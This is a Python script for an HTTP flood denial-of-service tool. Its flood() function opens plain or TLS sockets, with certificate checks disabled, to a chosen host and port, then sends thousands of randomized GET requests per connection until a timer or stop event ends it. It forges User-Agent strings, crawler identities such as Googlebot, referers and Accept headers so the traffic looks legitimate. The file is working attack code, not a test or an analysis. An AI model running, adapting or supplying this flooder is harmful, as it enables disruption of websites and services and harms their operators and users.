#!/usr/bin/env python3
import random
import socket
import ssl
import threading
import time
import requests
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from typing import Any, List, Set, Tuple
from urllib import parse
from urllib.parse import urlencode
import os

choice = ["Macintosh", "Windows", "X11"]
choice2 = ["68K", "PPC", "Intel Mac OS X"]
choice3 = [
    "Win3.11",
    "WinNT3.51",
    "WinNT4.0",
    "Windows NT 5.0",
    "Windows NT 5.1",
    "Windows NT 5.2",
    "Windows NT 6.0",
    "Windows NT 6.1",
    "Windows NT 6.2",
    "Win 9x 4.90",
    "WindowsCE",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows NT 10.0; Win64; x64",
]
choice4 = ["Linux i686", "Linux x86_64"]
choice5 = ["chrome", "spider", "ie"]
abcd = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
choice6 = [".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"]
spider = [
    "AdsBot-Google ( http://www.google.com/adsbot.html)",
    "Baiduspider ( http://www.baidu.com/search/spider.htm)",
    "FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
    "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
    "Googlebot-Image/1.0",
    "Googlebot-News",
    "Googlebot-Video/1.0",
]
referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?auto=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
]
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
]

count = 0


def flood(host, port, duration, key, page, stop_event, start_time, thread_index=0):

    addr = (host, int(port))
    # res = get_user_agent()
    file_path = os.path.join(os.path.dirname(__file__), "useragents.txt")

    with open(file_path, "r") as f:
        lines = f.readlines()
    res = random.choice(lines)
    header = " HTTP/1.1\r\nHost: "
    header += "{}:{}\r\n".format(host, port)

    header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
    header += "User-Agent: " + res + "\r\n"
    header += random.choice(acceptall)
    header += random.choice(referers) + "\r\n"
    global count

    while not stop_event.is_set() and time.time() - start_time < duration:
        if stop_event.is_set():
            break
        s = None
        try:
            if port == "443":
                # Create an SSL context with the mentioned configurations
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                # Create a socket
                raw_sock = socket.create_connection(addr)
                s = context.wrap_socket(raw_sock, server_hostname=host)
            else:
                s = socket.create_connection(addr)

            for _ in range(2000):
                if stop_event.is_set():
                    break
                request = ""
                request += "GET " + page + key
                request += str(random.randint(0, 21474837)) + "".join(
                    random.choice(abcd) for _ in range(500)
                )
                request += header + "\r\n"
                s.sendall(request.encode())
                count = count + 1

        except socket.error as e:
            count = count + 1
            pass
            # logger.info("Connection Down")
        finally:
            if s:
                s.close()


# selecting random user agent for header
def get_user_agent():
    platform = random.choice(choice)

    if platform == "Macintosh":
        os = random.choice(choice2[:-1])
    elif platform == "Windows":
        os = random.choice(choice3[:-1])
    elif platform == "X11":
        os = random.choice(choice4[:-1])

    browser = random.choice(choice5[:-1])

    if browser == "chrome":
        webkit = str(random.randint(500, 598))
        uwu = (
            str(random.randint(0, 98))
            + ".0"
            + str(random.randint(0, 9998))
            + "."
            + str(random.randint(0, 998))
        )
        return f"Mozilla/5.0 ({os}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{uwu} Safari/{webkit}"
    elif browser == "ie":
        uwu = str(random.randint(0, 98)) + ".0"
        engine = str(random.randint(0, 98)) + ".0"
        token = random.choice(choice6[:-1]) + "; " if random.randint(0, 1) == 1 else ""
        return f"Mozilla/5.0 (compatible; MSIE {uwu}; {os}; {token}Trident/{engine})"

    return random.choice(spider)
